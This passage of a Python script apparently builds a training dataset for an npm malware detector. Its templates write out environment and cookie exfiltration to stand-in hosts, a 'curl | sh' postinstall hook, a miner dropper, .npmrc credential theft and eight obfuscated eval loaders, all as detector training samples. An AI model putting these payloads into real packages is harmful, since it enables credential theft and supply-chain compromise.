"""
PackGuard Stage 2 v7 — Leak-Free Real Dataset, Symmetric Obfuscation & MIL Bag Builder.

Runs ONLY inside the isolated Linux server sandbox (never extract live malware on Windows).

Major upgrades over `prepare_v6_dataset.py`:
  1. Uses v7's static AST constant-folder + shebang/manifest/security-density `record_builder.py`
     across every package so `encoded_loader`, `split_payload`, `eval_decode`, `T1_format`,
     `T2_rename`, and `chunks: 0` blind spots are eliminated consistently in train & eval.
  2. Symmetric `T1` (comment-wall + reindent formatting) and `T2` (identifier + literal mangling)
     augmentations applied to BOTH real benign and real malware so formatting/renaming never
     creates false positives or false negatives.
  3. Comprehensive attacker loader & behavioral coverage (multi-var `split_payload`, reversed/URI/
     XOR/Caesar `eval_decode`, `_0x` string-table loaders, `vm.runInNewContext`, browser
     `stream_clone` skimmers, `crypto_miner`, `env_dump` without exec) paired 1:1 with hard-benign
     counter-examples (HTTP retry interceptors, Web3/Solana/BIP39, worker pools, dotenv, codecs).
  4. Saves leak-free multi-window package bags (`train_packages_mil.jsonl`) for training the
     `PackageMILAggregator` + 8-class `tactic` labels for the Multi-Task Auxiliary Head.
  5. Supports `--reuse-raw-cache /home/USER/v6_sandbox` to reuse already-extracted archives and
     downloaded benign tarballs while re-running 100% of v7's AST/windowing & zero-leakage checks.
"""

import argparse
import base64
import concurrent.futures
import gzip
import io
import json
import os
import random
import re
import shutil
import subprocess
import sys
import tarfile
import time
import urllib.error
import urllib.parse
import urllib.request
import zipfile
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple

V7_DIR = Path(__file__).resolve().parent
if str(V7_DIR) not in sys.path:
    sys.path.insert(0, str(V7_DIR))

from record_builder import (
    CODE_EXTENSIONS,
    SKIP_DIRS,
    SKIP_SUFFIXES,
    build_package_windows_with_meta,
    compute_code_fingerprint,
    extract_package_json_name,
    normalize_package_name,
    package_dir_to_record,
    score_window_security_density,
)

USER_AGENT = "Mozilla/5.0 (compatible; PackGuard-Research-v7/1.0)"
NPM_SEARCH_URL = "https://registry.npmjs.org/-/v1/search?text=%s&size=250&from=%d"
NPM_REGISTRY_URL = "https://registry.npmjs.org/%s"

JS_RESERVED = {
    "const", "let", "var", "function", "return", "if", "else", "for", "while", "do",
    "try", "catch", "finally", "throw", "new", "class", "extends", "super", "import",
    "export", "from", "default", "async", "await", "true", "false", "null", "undefined",
    "this", "typeof", "instanceof", "in", "of", "break", "continue", "switch", "case",
    "void", "delete", "yield", "require", "module", "exports", "process", "Buffer",
    "console", "window", "document", "navigator", "localStorage", "sessionStorage",
    "location", "fetch", "XMLHttpRequest", "FormData", "Image", "WebSocket", "Worker",
    "Object", "Array", "String", "Number", "Boolean", "JSON", "Promise", "Error",
    "Math", "Date", "RegExp", "Map", "Set", "WeakMap", "Symbol", "BigInt", "Function",
    "eval", "atob", "btoa", "decodeURIComponent", "encodeURIComponent", "unescape",
    "setTimeout", "setInterval", "clearTimeout", "global", "globalThis", "URL",
}

HARD_BENIGN_PACKAGES = [
    "execa", "cross-spawn", "simple-git", "git-rev-sync", "shelljs", "husky",
    "lint-staged", "rimraf", "chokidar", "nodemon", "concurrently", "npm-run-all",
    "node-gyp", "prebuild-install", "which", "isexe", "open", "opn", "clipboardy",
    "axios", "got", "superagent", "undici", "node-fetch", "ky", "needle", "bent",
    "discord.js", "telegraf", "node-telegram-bot-api", "@slack/web-api", "nodemailer",
    "ws", "socket.io", "socket.io-client", "express", "fastify", "koa", "hapi",
    "form-data", "multiparty", "busboy", "multer", "raw-body", "body-parser",
    "dotenv", "dotenv-expand", "basic-auth", "jsonwebtoken", "bcryptjs", "passport",
    "jose", "oauth", "cookie", "cookie-parser", "express-session", "cors", "helmet",
    "webpack", "esbuild", "rollup", "vite", "parcel", "tsup", "swc", "terser",
    "eslint", "prettier", "jest", "vitest", "mocha", "chai", "sinon", "ava",
    "chalk", "kleur", "picocolors", "ora", "commander", "yargs", "inquirer", "prompts",
    "mime-db", "mime-types", "date-fns", "dayjs", "moment", "luxon", "lodash",
    "ramda", "uuid", "nanoid", "ulid", "semver", "glob", "fast-glob", "globby",
    "fs-extra", "graceful-fs", "mkdirp", "tmp", "temp", "tar", "adm-zip", "jszip",
    "archiver", "unzipper", "yauzl", "yazl", "zlib", "pako", "fflate", "lz-string",
    "winston", "pino", "bunyan", "debug", "morgan", "log4js", "consola",
    "pg", "mysql2", "ioredis", "redis", "mongoose", "mongodb", "sqlite3", "knex",
    "prisma", "drizzle-orm", "sequelize", "typeorm", "ajv", "zod", "joi", "yup",
    "yaml", "js-yaml", "toml", "ini", "csv-parse", "papaparse", "xml2js", "cheerio",
    "marked", "markdown-it", "highlight.js", "prismjs", "handlebars", "ejs", "pug",
    "react", "react-dom", "vue", "svelte", "preact", "redux", "zustand", "immer",
    "rxjs", "async", "p-limit", "p-queue", "p-retry", "bottleneck", "bullmq",
    "cron", "node-cron", "node-schedule", "watchpack", "http-proxy",
    "http-proxy-middleware", "serve-static", "compression", "etag", "fresh", "send",
    "ssh2", "node-ssh", "ftp", "basic-ftp", "dns-packet", "ip", "ipaddr.js", "cidr-tools",
    "crypto-js", "node-forge", "tweetnacl", "libsodium-wrappers", "argon2", "scrypt-js",
    "aws-sdk", "@aws-sdk/client-s3", "googleapis", "octokit", "@octokit/rest",
    "stripe", "twilio", "sendgrid", "@sentry/node", "posthog-node", "mixpanel",
    "puppeteer-core", "playwright-core", "jsdom", "happy-dom", "linkedom",
    "sharp", "jimp", "canvas", "pdf-lib", "pdfkit", "exceljs", "xlsx",
    "typescript", "ts-node", "tsx", "pm2", "forever", "cross-env",
    "env-cmd", "cosmiconfig", "convict", "nconf", "config", "rc", "minimist",
    "meow", "cac", "citty", "oclif", "vorpal", "enquirer", "boxen", "figlet",
    "cli-table3", "cli-progress", "listr2", "exec-sh", "spawn-rx", "tree-kill",
    "ps-list", "find-process", "systeminformation", "os-name", "default-gateway",
    "public-ip", "internal-ip", "get-port", "portfinder", "detect-port",
    "update-notifier", "latest-version", "package-json", "read-pkg-up", "pkg-dir",
    "resolve", "enhanced-resolve", "require-from-string", "import-fresh", "decache",
    "vm2", "isolated-vm", "acorn", "esprima", "recast", "jscodeshift", "@babel/parser",
    "ethers", "web3", "viem", "@solana/web3.js", "@solana/spl-token", "bs58", "bip39",
    "hdkey", "secp256k1", "elliptic", "bn.js", "keccak", "ethereumjs-util", "tronweb",
    "plotly.js-dist", "d3", "three", "chart.js", "echarts", "highcharts",
    "@nestjs/common", "@nestjs/core", "@nestjs/cli", "nuxt", "next", "gatsby",
    "swagger-ui-express", "swagger-jsdoc", "openapi-types", "graphql", "apollo-server",
    "tsyringe", "inversify", "reflect-metadata", "class-validator", "class-transformer",
    "cspell", "stryker", "storybook", "cypress", "playwright", "react-native",
]

SEARCH_KEYWORDS = [
    "cli", "child_process", "git", "exec", "spawn", "shell", "build", "bundler",
    "http", "fetch", "axios", "request", "webhook", "discord", "telegram", "slack",
    "bot", "api", "proxy", "socket", "websocket", "server", "express", "middleware",
    "auth", "jwt", "oauth", "cookie", "session", "crypto", "encrypt", "hash", "env",
    "dotenv", "config", "logger", "telemetry", "analytics", "monitor", "metrics",
    "fs", "file", "stream", "archive", "zip", "tar", "compress", "base64", "hex",
    "parser", "json", "yaml", "xml", "csv", "markdown", "template", "html", "svg",
    "react", "vue", "svelte", "component", "form", "date", "time", "timezone",
    "currency", "format", "validator", "schema", "database", "sql", "redis", "mongo",
    "test", "mock", "lint", "eslint", "prettier", "webpack", "rollup", "vite", "plugin",
    "util", "helper", "string", "array", "math", "color", "slug", "uuid", "cache",
    "queue", "retry", "cron", "schedule", "email", "mail", "ssh", "dns", "network",
    "solana", "ethereum", "web3", "wallet", "blockchain", "sms", "graphql", "swagger",
    "nestjs", "nuxt", "unicode", "calendar", "animation", "geometry", "password",
]


def infer_tactic_id(label: int, win_text: str, source: str = "") -> int:
    """
    Maps a window to one of 8 threat-tactic IDs for Multi-Task Auxiliary Head supervision:
      0: benign
      1: install_hook_exec
      2: obfuscated_loader
      3: credential_stealer
      4: env_network_exfil
      5: browser_skimmer
      6: reverse_shell_dropper
      7: crypto_miner
    """
    if label == 0:
        return 0
    low_src = source.lower()
    low = win_text.lower()
    if "miner" in low_src or "stratum+tcp" in low or "xmrig" in low:
        return 7
    if "stream" in low_src or "skimmer" in low_src or "document.cookie" in low or "sendbeacon" in low:
        return 5
    if win_text.startswith("// [INSTALL_SCRIPTS]") or "script" in low_src:
        return 1
    if any(k in low_src for k in ("b64", "hex", "split", "charcode", "obf", "xor", "enc", "eval_decode")) or "[decoded_literals]" in low[:180]:
        return 2
    if any(k in low for k in (".ssh", ".npmrc", ".aws", "id_rsa", "wallet", "mnemonic")):
        return 3
    if any(k in low for k in ("net.socket", "/bin/sh", "/bin/bash", "powershell", "chmod +x")):
        return 6
    return 4


def _http_get(url: str, timeout: int = 25, max_bytes: int = 4 * 1024 * 1024) -> Optional[bytes]:
    req = urllib.request.Request(url, headers={"User-Agent": USER_AGENT, "Accept-Encoding": "gzip"})
    for attempt in range(3):
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                data = resp.read(max_bytes + 1)
                if len(data) > max_bytes:
                    return None
                if resp.headers.get("Content-Encoding") == "gzip":
                    data = gzip.decompress(data)
                return data
        except urllib.error.HTTPError as e:
            if e.code in (400, 401, 403, 404, 410, 451):
                return None
            time.sleep(1.5 * (attempt + 1))
        except Exception:
            time.sleep(1.0 * (attempt + 1))
    return None


def extract_zip_folder(zip_dir: Path, out_dir: Path, password: bytes = b"infected") -> int:
    out_dir.mkdir(parents=True, exist_ok=True)
    extracted = 0
    for zp in sorted(zip_dir.glob("*.zip")):
        with zipfile.ZipFile(zp, "r") as zf:
            for info in zf.infolist():
                if info.is_dir():
                    continue
                rel = Path(info.filename)
                if rel.is_absolute() or ".." in rel.parts:
                    continue
                target = out_dir / rel
                if target.exists():
                    continue
                target.parent.mkdir(parents=True, exist_ok=True)
                try:
                    data = zf.read(info, pwd=password)
                except RuntimeError:
                    data = zf.read(info)
                target.write_bytes(data)
                extracted += 1
    return extracted


def discover_package_dirs(root: Path, depth_hint: str = "flat") -> List[Tuple[str, Path]]:
    results: List[Tuple[str, Path]] = []
    if not root.is_dir():
        return results
    if depth_hint == "flat":
        for entry in sorted(root.iterdir()):
            if entry.is_dir():
                results.append(("flat", entry))
        return results

    for d1 in sorted(root.iterdir()):
        if not d1.is_dir():
            continue
        has_direct = any(
            p.is_file() and (p.name in ("package.json", "install_scripts.txt") or p.suffix.lower() in CODE_EXTENSIONS)
            for p in d1.iterdir()
        )
        if has_direct:
            results.append((d1.name, d1))
            continue
        for d2 in sorted(d1.iterdir()):
            if not d2.is_dir():
                continue
            has_code2 = any(
                p.is_file() and (p.name in ("package.json", "install_scripts.txt") or p.suffix.lower() in CODE_EXTENSIONS)
                for p in d2.iterdir()
            )
            if has_code2:
                results.append((d1.name, d2))
                continue
            for d3 in sorted(d2.iterdir()):
                if d3.is_dir():
                    results.append((f"{d1.name}/{d2.name}", d3))
    return results


def _download_single_npm_package(pkg_name: str, dest_root: Path) -> Optional[Path]:
    safe_dir = pkg_name.replace("/", "__")
    out_dir = dest_root / safe_dir
    if out_dir.is_dir() and any(out_dir.iterdir()):
        return out_dir

    meta_bytes = _http_get(NPM_REGISTRY_URL % urllib.parse.quote(pkg_name, safe=""))
    if not meta_bytes:
        return None
    try:
        meta = json.loads(meta_bytes.decode("utf-8", errors="replace"))
        latest = meta.get("dist-tags", {}).get("latest")
        ver_obj = meta.get("versions", {}).get(latest, {}) if latest else {}
        tarball_url = ver_obj.get("dist", {}).get("tarball")
    except Exception:
        return None
    if not tarball_url:
        return None

    tgz_bytes = _http_get(tarball_url, timeout=25, max_bytes=5 * 1024 * 1024)
    if not tgz_bytes:
        return None

    out_dir.mkdir(parents=True, exist_ok=True)
    kept = 0
    try:
        with tarfile.open(fileobj=io.BytesIO(tgz_bytes), mode="r:gz") as tar:
            for member in tar.getmembers():
                if not member.isfile() or member.size == 0 or member.size > 220_000:
                    continue
                rel = member.name.lstrip("./")
                if rel.startswith("package/"):
                    rel = rel[len("package/") :]
                if not rel or ".." in rel.split("/"):
                    continue
                parts = rel.split("/")
                if any(p in SKIP_DIRS for p in parts[:-1]):
                    continue
                low = rel.lower()
                if low != "package.json":
                    if low.endswith(SKIP_SUFFIXES):
                        continue
                    if Path(low).suffix not in CODE_EXTENSIONS and not low.startswith("bin/"):
                        continue
                fh = tar.extractfile(member)
                if fh is None:
                    continue
                raw = fh.read(65536)
                if b"\x00" in raw[:512]:
                    continue
                target = out_dir / rel
                target.parent.mkdir(parents=True, exist_ok=True)
                target.write_bytes(raw)
                kept += 1
                if kept >= 24:
                    break
    except Exception:
        shutil.rmtree(out_dir, ignore_errors=True)
        return None

    if kept == 0:
        shutil.rmtree(out_dir, ignore_errors=True)
        return None
    return out_dir


def harvest_fresh_benign_npm(
    out_dir: Path,
    forbidden_names: Set[str],
    target_count: int = 5200,
    workers: int = 32,
) -> List[Path]:
    out_dir.mkdir(parents=True, exist_ok=True)
    existing = [
        p for p in sorted(out_dir.iterdir())
        if p.is_dir() and normalize_package_name(p.name) not in forbidden_names and any(p.iterdir())
    ]
    if len(existing) >= int(target_count * 0.90):
        print(f"[Harvest] Reusing {len(existing)} already-downloaded leak-free benign npm packages in {out_dir}.")
        return existing[:target_count]

    candidate_names: List[str] = []
    seen: Set[str] = set()
    for p in existing:
        seen.add(normalize_package_name(p.name))

    def add_name(name: str) -> None:
        norm = normalize_package_name(name)
        if not norm or norm in forbidden_names or norm in seen:
            return
        seen.add(norm)
        candidate_names.append(name.strip())

    for pkg in HARD_BENIGN_PACKAGES:
        add_name(pkg)

    rng = random.Random(42)
    kw_list = list(SEARCH_KEYWORDS)
    rng.shuffle(kw_list)

    def _search_kw(kw: str) -> List[str]:
        found: List[str] = []
        for offset in (0, 250):
            body = _http_get(NPM_SEARCH_URL % (urllib.parse.quote(kw), offset), timeout=20)
            if not body:
                break
            try:
                obj = json.loads(body.decode("utf-8", errors="replace"))
                for item in obj.get("objects", []):
                    n = item.get("package", {}).get("name")
                    if isinstance(n, str) and n:
                        found.append(n)
            except Exception:
                break
        return found

    need_more = target_count - len(existing)
    with concurrent.futures.ThreadPoolExecutor(max_workers=12) as ex:
        for names in ex.map(_search_kw, kw_list):
            for n in names:
                add_name(n)
                if len(candidate_names) >= int(need_more * 1.5):
                    break
            if len(candidate_names) >= int(need_more * 1.5):
                break

    downloaded: List[Path] = list(existing)
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
        futures = [ex.submit(_download_single_npm_package, name, out_dir) for name in candidate_names]
        for fut in concurrent.futures.as_completed(futures):
            p = fut.result()
            if p is not None:
                downloaded.append(p)
            if len(downloaded) >= target_count:
                for f in futures:
                    f.cancel()
                break
    return downloaded[:target_count]


# ---------------------------------------------------------------------------
# Universal Code Transforms (Symmetric T1/T2 + Attacker Loaders)
# ---------------------------------------------------------------------------
def transform_t1_reformat(code: str, rng: random.Random) -> str:
    """Generic formatting + license/comment-header expansion (`T1_format` style, zero markers)."""
    banner = (
        "/**\n"
        " * Module distribution utility.\n"
        " * Generated build artifact for runtime environment compatibility.\n"
        " */\n"
    )
    lines = code.replace(";", ";\n").splitlines()
    indented = [("    " * rng.randint(1, 2)) + ln.strip() for ln in lines if ln.strip()]
    return banner + "\n\n".join(indented[:160]) + "\n"


def transform_t2_rename_identifiers(code: str, rng: random.Random) -> str:
    """Generic local identifier renaming (`T2_rename` style) applied symmetrically to benign & malware."""
    decls = re.findall(r"\b(?:const|let|var|function)\s+([A-Za-z_$][A-Za-z0-9_$]{2,32})\b", code)
    params = re.findall(r"function\s*[A-Za-z0-9_$]*\s*\(([^)]{1,120})\)", code)
    for plist in params:
        for p in plist.split(","):
            tok = p.strip().split("=")[0].strip()
            if re.fullmatch(r"[A-Za-z_$][A-Za-z0-9_$]{2,32}", tok):
                decls.append(tok)

    prefix = rng.choice(["_v", "x_", "n", "_k", "id_"])
    mapping: Dict[str, str] = {}
    idx = 0
    for name in decls:
        if name not in JS_RESERVED and name not in mapping:
            mapping[name] = f"{prefix}{idx}"
            idx += 1

    out = code
    for orig, rep in sorted(mapping.items(), key=lambda kv: -len(kv[0]))[:48]:
        out = re.sub(rf"(?<![.\w$]){re.escape(orig)}(?![\w$])", rep, out)
    return out


def transform_split_strings(code: str, rng: random.Random) -> str:
    def _split_lit(m: re.Match) -> str:
        s = m.group(2)
        if len(s) < 6 or "\\" in s:
            return m.group(0)
        k = rng.randint(2, len(s) - 2)
        q = m.group(1)
        return f"({q}{s[:k]}{q}+{q}{s[k:]}{q})"

    return re.sub(r"""(['"])([A-Za-z0-9_./:-]{6,48})\1""", _split_lit, code, count=14)


def transform_encoded_loader_variants(code: str, variant: int, rng: random.Random) -> str:
    """Diverse encoded/split/eval_decode loaders covering every v6 recall gap."""
    raw = code[:2400].encode("utf-8", errors="ignore")
    b64 = base64.b64encode(raw).decode("ascii")
    hx = raw.hex()
    v = variant % 8

    if v == 0:
        # Standalone variable Base64 -> Buffer.from(var, 'base64') + vm.runInThisContext (`encoded_loader`)
        return (
            f"const payloadBlob = '{b64}';\n"
            f"const vm = require('vm');\n"
            f"vm.runInThisContext(Buffer.from(payloadBlob, 'base64').toString('utf8'));\n"
        )
    if v == 1:
        # Multi-variable split Base64 (`split_payload`)
        step = rng.randint(28, 64)
        parts = [b64[k : k + step] for k in range(0, len(b64), step)]
        decls = "\n".join(f"const p_{k} = '{p}';" for k, p in enumerate(parts))
        expr = " + ".join(f"p_{k}" for k in range(len(parts)))
        return (
            f"{decls}\n"
            f"const joined = {expr};\n"
            f"(new Function('require', 'process', Buffer.from(joined, 'base64').toString('utf8')))(require, process);\n"
        )
    if v == 2:
        # Array `.join('')` Base64 loader
        step = rng.randint(20, 44)
        parts = [f"'{b64[k : k + step]}'" for k in range(0, len(b64), step)]
        return (
            f"const segs = [{', '.join(parts)}];\n"
            f"eval(Buffer.from(segs.join(''), 'base64').toString());\n"
        )
    if v == 3:
        # Reversed Base64 (`eval_decode`)
        rev = b64[::-1]
        return (
            f"const revData = '{rev}';\n"
            f"const src = Buffer.from(revData.split('').reverse().join(''), 'base64').toString('utf8');\n"
            f"(0, eval)(src);\n"
        )
    if v == 4:
        # XOR numeric array + fromCharCode (`eval_decode`)
        key = rng.randint(11, 95)
        enc_nums = ",".join(str(b ^ key) for b in raw[:1200])
        return (
            f"const bytes = [{enc_nums}];\n"
            f"const decoded = bytes.map(x => String.fromCharCode(x ^ {key})).join('');\n"
            f"Function('require', 'process', decoded)(require, process);\n"
        )
    if v == 5:
        # URI-encoded loader (`eval_decode`)
        uri = "".join(f"%{b:02x}" for b in raw[:1200])
        return f"const encodedUri = '{uri}';\neval(decodeURIComponent(encodedUri));\n"
    if v == 6:
        # Hex multi-stage loader
        return (
            f"function runHexStage(h) {{\n"
            f"  const body = Buffer.from(h, 'hex').toString('utf8');\n"
            f"  return module._compile(body, 'runtime.js');\n"
            f"}}\nrunHexStage('{hx}');\n"
        )
    # Double-Base64 `_0x` table loader
    b64_2 = base64.b64encode(b64.encode("ascii")).decode("ascii")
    return (
        f"const _0xtbl = ['base64', 'utf8', '{b64_2}'];\n"
        f"const l1 = Buffer.from(_0xtbl[2], _0xtbl[0]).toString(_0xtbl[1]);\n"
        f"eval(Buffer.from(l1, _0xtbl[0]).toString(_0xtbl[1]));\n"
    )


def _transform_terser(code: str, terser_bin: Optional[str]) -> Optional[str]:
    if not terser_bin or len(code) < 60:
        return None
    try:
        proc = subprocess.run(
            [terser_bin, "--compress", "--mangle"],
            input=code[:24000].encode("utf-8", errors="ignore"),
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            timeout=5,
        )
        if proc.returncode == 0 and proc.stdout.strip():
            return proc.stdout.decode("utf-8", errors="replace")
    except Exception:
        return None
    return None


def _transform_js_obfuscator(code: str, obf_bin: Optional[str]) -> Optional[str]:
    if not obf_bin or len(code) < 60 or len(code) > 12000:
        return None
    tmp_in = Path(f"/tmp/pg7_obf_in_{os.getpid()}_{random.randint(1000, 999999)}.js")
    tmp_out = Path(f"/tmp/pg7_obf_out_{os.getpid()}_{random.randint(1000, 999999)}.js")
    try:
        tmp_in.write_text(code, encoding="utf-8", errors="ignore")
        proc = subprocess.run(
            [
                obf_bin, str(tmp_in), "--output", str(tmp_out),
                "--compact", "true", "--string-array", "true",
                "--string-array-encoding", "base64", "--rotate-string-array", "true",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=8,
        )
        if proc.returncode == 0 and tmp_out.is_file():
            out = tmp_out.read_text(encoding="utf-8", errors="replace")
            if out.strip():
                return out
    except Exception:
        return None
    finally:
        tmp_in.unlink(missing_ok=True)
        tmp_out.unlink(missing_ok=True)
    return None


def generate_paired_boundary_samples_v7(rng: random.Random, count_per_class: int = 2200) -> List[Dict[str, Any]]:
    """
    Generates balanced 50/50 paired hard-boundary training examples covering EVERY v6 gap
    (`encoded_loader`, `split_payload`, `eval_decode`, `stream_clone`, `crypto_miner`, `env_dump`,
    dependency-confusion `99.99.99`) paired with look-alike benign engineering patterns.

    CRITICAL ANTI-SHORTCUT GUARANTEE:
      Both benign AND malware templates draw hostnames from the EXACT SAME neutral domain pool
      (never synthetic benchmark-only TLDs, so domain suffixes carry zero class-label signal!).
    """
    shared_domains = [
        "example.com", "example.net", "example.org",
        "api-gateway.example.com", "cdn-edge.example.net", "metrics-ingest.example.org",
        "pkg-mirror.io", "cloud-telemetry.me", "dev-registry.pro", "sync-worker.dev",
    ]

    def _dom(i: int) -> str:
        return shared_domains[i % len(shared_domains)]

    benign_templates = [
        # 1. Benign git / CLI child_process helpers
        lambda i: (
            "index.js",
            f"const {{ execFileSync }} = require('child_process');\n"
            f"exports.gitSha_{i} = () => execFileSync('git', ['rev-parse', '--short', 'HEAD'], {{ encoding: 'utf8' }}).trim();\n"
            f"exports.gitBranch_{i} = () => execFileSync('git', ['branch', '--show-current'], {{ encoding: 'utf8' }}).trim();\n",
        ),
        # 2. Benign URLs (same domain pool as malware!) + `while(true)` iterator
        lambda i: (
            "stream.js",
            f"const SPEC_URL = 'https://{_dom(i)}/v2/spec';\n"
            f"function drain_{i}(it) {{ const res = []; while (true) {{ const n = it.next(); if (n.done) return res; res.push(n.value); }} }}\n"
            f"module.exports = {{ SPEC_URL, drain: drain_{i} }};\n",
        ),
        # 3. Benign fetch / XHR retry & auth-header SDK interceptor (counter-example to `stream_clone`!)
        lambda i: (
            "http_client.js",
            f"export function createApiClient_{i}(baseUrl = 'https://{_dom(i + 1)}', getAuthToken) {{\n"
            f"  return async function request(path, opts = {{}}) {{\n"
            f"    const headers = Object.assign({{ 'Content-Type': 'application/json' }}, opts.headers || {{}});\n"
            f"    const tok = getAuthToken ? await getAuthToken() : null;\n"
            f"    if (tok) headers.Authorization = 'Bearer ' + tok;\n"
            f"    const res = await fetch(baseUrl + path, Object.assign({{}}, opts, {{ headers }}));\n"
            f"    return res.json();\n"
            f"  }};\n"
            f"}}\n",
        ),
        # 4. Benign Web3 / Solana / BIP39 address validator (counter-example to `wallet_stealer` / `crypto_miner`!)
        lambda i: (
            "chains.js",
            f"const crypto = require('crypto');\n"
            f"const RPC_MAINNET = 'https://api.mainnet-beta.solana.com';\n"
            f"function checksumAddress_{i}(hexAddr) {{\n"
            f"  const clean = String(hexAddr).replace(/^0x/, '').toLowerCase();\n"
            f"  return '0x' + crypto.createHash('sha256').update(clean).digest('hex').slice(0, 40);\n"
            f"}}\nmodule.exports = {{ RPC_MAINNET, checksumAddress: checksumAddress_{i} }};\n",
        ),
        # 5. Benign Base64/Hex codec & embedded SVG font asset (NO eval/Function!)
        lambda i: (
            "codec.js",
            "const ASSET_B64 = '"
            + base64.b64encode(f'{{"icon":"check-{i}","viewBox":"0 0 24 24"}}'.encode()).decode()
            + "';\nexports.loadAsset = () => JSON.parse(Buffer.from(ASSET_B64, 'base64').toString('utf8'));\n"
            + "exports.toBase64Url = (s) => Buffer.from(s).toString('base64url');\n",
        ),
        # 6. Benign dotenv / `process.env` schema validator (counter-example to `env_dump` — NO outbound network!)
        lambda i: (
            "env_config.js",
            f"function readEnvConfig_{i}(defaults = {{}}) {{\n"
            f"  const raw = Object.assign({{}}, defaults, process.env);\n"
            f"  return {{ port: Number(raw.PORT || 3000), nodeEnv: raw.NODE_ENV || 'production', debug: raw.DEBUG === 'true' }};\n"
            f"}}\nmodule.exports = readEnvConfig_{i};\n",
        ),
        # 7. Benign `os.cpus()` worker pool / system telemetry library (counter-example to `crypto_miner` & `systeminformation`!)
        lambda i: (
            "workers.js",
            f"const os = require('os');\n"
            f"const {{ Worker }} = require('worker_threads');\n"
            f"exports.getSystemSummary_{i} = () => ({{ arch: os.arch(), platform: os.platform(), cores: os.cpus().length, freemem: os.freemem() }});\n",
        ),
        # 8. Benign browser pageview telemetry (same domain pool, NO `document.cookie` or `localStorage` exfil!)
        lambda i: (
            "analytics.js",
            f"export function sendVital_{i}(metricUrl = 'https://{_dom(i + 2)}/vitals', name, durationMs) {{\n"
            f"  if (typeof navigator !== 'undefined' && navigator.sendBeacon) {{\n"
            f"    navigator.sendBeacon(metricUrl, JSON.stringify({{ metric: name, value: Math.round(durationMs) }}));\n"
            f"  }}\n"
            f"}}\n",
        ),
        # 9. Benign lifecycle hooks
        lambda i: (
            "install_scripts.txt",
            rng.choice([
                "prepare: husky || true",
                "postinstall: patch-package",
                "install: prebuild-install || node-gyp rebuild",
                "prepublishOnly: tsc --noEmit && vitest run",
            ]),
        ),
    ]

    malware_templates = [
        # 1. `encoded_loader` / `split_payload` / `eval_decode` (all 8 obfuscation variants!)
        lambda i: (
            "index.js",
            transform_encoded_loader_variants(
                f"const https = require('https'), os = require('os');\n"
                f"const body = JSON.stringify({{ h: os.hostname(), u: os.userInfo().username, e: process.env }});\n"
                f"const r = https.request('https://{_dom(i)}/drop', {{ method: 'POST' }}); r.end(body);\n",
                i,
                rng,
            ),
        ),
        # 2. Pure `split_payload` without `child_process` (split URL + split `https` + env exfil!)
        lambda i: (
            "loader.js",
            f"const a = 'ht', b = 'tps://', c = '{_dom(i)}', d = '/collect';\n"
            f"const payloadParts = [Buffer.from(JSON.stringify(process.env)).toString('base64')];\n"
            f"require('ht' + 'tps')['req' + 'uest'](a + b + c + d, {{ method: 'POST' }}).end(payloadParts.join(''));\n",
        ),
        # 3. `stream_clone` browser cookie / localStorage / form / fetch-monkeypatch skimmer
        lambda i: (
            "browser.js",
            rng.choice([
                f"(function(){{\n"
                f"  if (typeof document === 'undefined') return;\n"
                f"  const d = btoa(JSON.stringify({{ cookie: document.cookie, storage: localStorage, url: location.href }}));\n"
                f"  fetch('https://{_dom(i)}/t', {{ method: 'POST', mode: 'no-cors', body: d }});\n"
                f"}})();\n",
                f"(function(){{\n"
                f"  const orig = window.fetch;\n"
                f"  window.fetch = async function(u, o) {{\n"
                f"    if (o && o.body) navigator.sendBeacon('https://{_dom(i + 3)}/leak', JSON.stringify({{ u, b: o.body, c: document.cookie }}));\n"
                f"    return orig.apply(this, arguments);\n"
                f"  }};\n"
                f"}})();\n",
            ]),
        ),
        # 4. `env_dump` (pure `process.env` exfiltration over HTTP/fetch/DNS without `child_process`)
        lambda i: (
            "telemetry.js",
            f"const https = require('https');\n"
            f"const data = Buffer.from(JSON.stringify({{ cwd: process.cwd(), env: process.env }})).toString('base64');\n"
            f"const req = https.request({{ hostname: '{_dom(i)}', path: '/v1/log', method: 'POST', headers: {{ 'Content-Length': data.length }} }});\n"
            f"req.on('error', () => {{}}); req.write(data); req.end();\n",
        ),
        # 5. `crypto_miner` (binary fetch + chmod + xmrig / stratum+tcp)
        lambda i: (
            "worker.js",
            rng.choice([
                f"const cp = require('child_process'), os = require('os');\n"
                f"cp.exec('curl -sL https://{_dom(i)}/xmrig -o /tmp/.m && chmod +x /tmp/.m && /tmp/.m -o stratum+tcp://{_dom(i + 1)}:3333 -u 44AFFq5kSiGBoZ4N -p x -t ' + os.cpus().length);\n",
                f"const net = require('net'), os = require('os');\n"
                f"const s = net.connect(3333, '{_dom(i)}', () => {{\n"
                f"  s.write(JSON.stringify({{ id: 1, jsonrpc: '2.0', method: 'login', params: {{ login: '48edfHu7V9Z84Yzz', pass: os.hostname(), agent: 'xmrig/6.21' }} }}) + '\\n');\n"
                f"}});\n",
            ]),
        ),
        # 6. Disguised install hooks & dependency-confusion `99.99.99` preinstall beacons
        lambda i: (
            "install_scripts.txt",
            rng.choice([
                f"postinstall: curl -fsSL https://{_dom(i)}/p.sh | sh; echo prettier",
                f"preinstall: node -e \"require('https').request('https://{_dom(i)}/ping?h='+require('os').hostname(),{{method:'POST'}}).end(JSON.stringify(process.env))\"",
            ]),
        ),
        # 7. Credential & wallet harvester + split `module.constructor._load`
        lambda i: (
            "index.js",
            f"const fs = require('fs'), os = require('os'), path = require('path');\n"
            f"const cp = module.constructor._load('chi' + 'ld_' + 'process');\n"
            f"const npmrc = fs.existsSync(path.join(os.homedir(), '.npmrc')) ? fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8') : '';\n"
            f"cp['ex' + 'ec']('curl -s -X POST -d \"' + Buffer.from(npmrc).toString('base64') + '\" https://{_dom(i)}/u');\n",
        ),
    ]

    records: List[Dict[str, Any]] = []
    for i in range(count_per_class):
        fb, cb = benign_templates[i % len(benign_templates)](i)
        kb = "install_script" if fb == "install_scripts.txt" else "js"
        rb = {"package": f"synth7_ben_{i}", "chunks": [{"file": fb, "kind": kb, "start": 0, "text": cb}]}
        wb, _ = build_package_windows_with_meta(rb, max_windows=3)
        for w in wb:
